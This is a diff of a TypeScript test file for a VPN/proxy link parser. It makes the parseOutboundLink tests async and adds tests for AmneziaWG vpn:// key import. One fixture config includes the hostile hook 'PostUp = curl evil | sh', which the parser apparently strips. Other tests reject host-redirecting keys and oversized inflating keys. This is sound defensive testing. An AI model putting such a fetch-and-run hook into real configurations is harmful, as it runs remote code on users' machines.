@@ -1057,7 +1057,7 @@ describe('parseWireguardLink', () => {
 });
 
 describe('parseOutboundLink dispatcher', () => {
-  it('dispatches vmess via base64 JSON', () => {
+  it('dispatches vmess via base64 JSON', async () => {
     const json = {
       v: '2',
       ps: 'x',
@@ -1068,28 +1068,163 @@ describe('parseOutboundLink dispatcher', () => {
       tls: 'none',
     };
     const link = `vmess://${Base64.encode(JSON.stringify(json))}`;
-    expect(parseOutboundLink(link)?.protocol).toBe('vmess');
+    expect((await parseOutboundLink(link))?.protocol).toBe('vmess');
   });
 
-  it('dispatches vless via URL', () => {
-    expect(parseOutboundLink('vless://uuid@host:443?type=tcp&security=none')?.protocol).toBe(
-      'vless',
-    );
-  });
-
-  it('dispatches wireguard via URL', () => {
+  it('dispatches vless via URL', async () => {
     expect(
-      parseOutboundLink('wireguard://pk@host:22824?publickey=pub&address=10.0.0.2/32')?.protocol,
+      (await parseOutboundLink('vless://uuid@host:443?type=tcp&security=none'))?.protocol,
+    ).toBe('vless');
+  });
+
+  it('dispatches wireguard via URL', async () => {
+    expect(
+      (await parseOutboundLink('wireguard://pk@host:22824?publickey=pub&address=10.0.0.2/32'))
+        ?.protocol,
     ).toBe('wireguard');
   });
 
-  it('returns null for an unknown scheme', () => {
-    expect(parseOutboundLink('socks5://user:pass@host:1080')).toBeNull();
+  it('returns null for an unknown scheme', async () => {
+    expect(await parseOutboundLink('socks5://user:pass@host:1080')).toBeNull();
   });
 
-  it('returns null for empty input', () => {
-    expect(parseOutboundLink('')).toBeNull();
-    expect(parseOutboundLink('   ')).toBeNull();
+  it('returns null for empty input', async () => {
+    expect(await parseOutboundLink('')).toBeNull();
+    expect(await parseOutboundLink('   ')).toBeNull();
+  });
+});
+
+describe('parseOutboundLink — AmneziaWG vpn://', () => {
+  const conf = [
+    '[Interface]',
+    'PrivateKey = cPriv=',
+    'Address = 10.8.1.2/32, fd00::2/128',
+    'DNS = 1.1.1.1, 8.8.8.8',
+    'MTU = 1376',
+    'Jc = 4',
+    'Jmin = 10',
+    'Jmax = 50',
+    'S1 = 30',
+    'S2 = 40',
+    'H1 = 100-200',
+    'H2 = 300',
+    'H3 = 400',
+    'H4 = 500',
+    'I1 = <b 0xabc>',
+    'DisableCookies = on',
+    'PostUp = curl evil | sh',
+    '',
+    '# my-awg',
+    '[Peer]',
+    'PublicKey = sPub=',
+    'PresharedKey = psk=',
+    'AllowedIPs = 0.0.0.0/0, ::/0',
+    'Endpoint = awg.example.com:51820',
+    'PersistentKeepalive = 25',
+  ].join('\n');
+  const wantSettings = {
+    secretKey: 'cPriv=',
+    address: ['10.8.1.2/32', 'fd00::2/128'],
+    dns: '1.1.1.1',
+    mtu: 1376,
+    jc: 4,
+    jmin: 10,
+    jmax: 50,
+    s1: 30,
+    s2: 40,
+    s3: 0,
+    s4: 0,
+    h1: '100-200',
+    h2: '300',
+    h3: '400',
+    h4: '500',
+    i1: '<b 0xabc>',
+    randomTrailers: false,
+    disableCookies: true,
+    peers: [
+      {
+        publicKey: 'sPub=',
+        presharedKey: 'psk=',
+        allowedIPs: ['0.0.0.0/0', '::/0'],
+        endpoint: 'awg.example.com:51820',
+        keepAlive: 25,
+      },
+    ],
+  };
+  const b64url = (bytes: Uint8Array) =>
+    btoa(String.fromCharCode(...bytes))
+      .replace(/\+/g, '-')
+      .replace(/\//g, '_')
+      .replace(/=+$/, '');
+  const amneziaVPNKey = async (key: unknown) => {
+    const json = new TextEncoder().encode(JSON.stringify(key));
+    const zlib = new Uint8Array(
+      await new Response(
+        new Blob([json]).stream().pipeThrough(new CompressionStream('deflate')),
+      ).arrayBuffer(),
+    );
+    const framed = new Uint8Array(4 + zlib.length);
+    new DataView(framed.buffer).setUint32(0, json.length);
+    framed.set(zlib, 4);
+    return `vpn://${b64url(framed)}`;
+  };
+  const awgKey = (c: string) =>
+    amneziaVPNKey({
+      description: 'provider-de',
+      containers: [
+        { container: 'amnezia-awg', awg: { last_config: JSON.stringify({ config: c }) } },
+      ],
+    });
+
+  it.each([
+    ['3x-ui plain conf', async () => `vpn://${b64url(new TextEncoder().encode(conf))}`, 'my-awg'],
+    ['AmneziaVPN app key', () => awgKey(conf), 'my-awg'],
+    ['AmneziaVPN key without remark', () => awgKey(conf.replace('# my-awg\n', '')), 'provider-de'],
+  ])('imports a %s as an amneziawg outbound', async (_name, makeLink, tag) => {
+    expect(await parseOutboundLink(await makeLink())).toEqual({
+      protocol: 'amneziawg',
+      tag,
+      settings: wantSettings,
+    });
+  });
+
+  it('rejects a key without an AmneziaWG container', async () => {
+    const link = await amneziaVPNKey({
+      containers: [{ container: 'amnezia-openvpn', openvpn: { last_config: '{}' } }],
+    });
+    expect(await parseOutboundLink(link)).toBeNull();
+  });
+
+  // 3x-ui omits S3/S4 when 0 and legacy AmneziaWG never sends them; the form must not
+  // fall back to its own 12, or the outbound never completes a handshake with its server.
+  it('keeps an absent S3/S4 at 0 through the outbound form', async () => {
+    const parsed = await parseOutboundLink(`vpn://${b64url(new TextEncoder().encode(conf))}`);
+    const form = rawOutboundToFormValues(parsed!);
+    expect(form.protocol === 'amneziawg' && [form.settings.s3, form.settings.s4]).toEqual([0, 0]);
+  });
+
+  it('skips an AmneziaWG container without last_config, like the Go parser', async () => {
+    const link = await amneziaVPNKey({
+      containers: [
+        { container: 'amnezia-awg', awg: {} },
+        { container: 'amnezia-awg2', awg: { last_config: JSON.stringify({ config: conf }) } },
+      ],
+    });
+    expect((await parseOutboundLink(link))?.tag).toBe('my-awg');
+  });
+
+  it('keeps the lower bound of a ranged PersistentKeepalive', async () => {
+    const ranged = conf.replace('PersistentKeepalive = 25', 'PersistentKeepalive = 20-30');
+    const out = await parseOutboundLink(`vpn://${b64url(new TextEncoder().encode(ranged))}`);
+    expect(out).toMatchObject({ settings: { peers: [{ keepAlive: 20 }] } });
+  });
+
+  it('rejects a key that inflates past 1 MiB', async () => {
+    const link = await amneziaVPNKey({
+      description: 'a'.repeat(1_100_000),
+      containers: [{ awg: { last_config: JSON.stringify({ config: conf }) } }],
+    });
+    expect(await parseOutboundLink(link)).toBeNull();
   });
 });
 
@@ -1126,7 +1261,7 @@ describe('obfs=gecko packetSize validation', () => {
 });
 
 describe('parseOutboundLink — host-local keys', () => {
-  it('drops keys that redirect the dial or name host files, however they are cased', () => {
+  it('drops keys that redirect the dial or name host files, however they are cased', async () => {
     const extra = encodeURIComponent(
       JSON.stringify({
         downloadSettings: {
@@ -1144,7 +1279,7 @@ describe('parseOutboundLink — host-local keys', () => {
     const fm = encodeURIComponent(
       JSON.stringify({ tcp: [{ type: 'header-custom', settings: { DialerProxy: 'api' } }] }),
     );
-    const out = parseOutboundLink(
+    const out = await parseOutboundLink(
       `vless://uuid@8.8.8.8:443?type=xhttp&security=tls&extra=${extra}&fm=${fm}#node`,
     );
     const json = JSON.stringify(out);
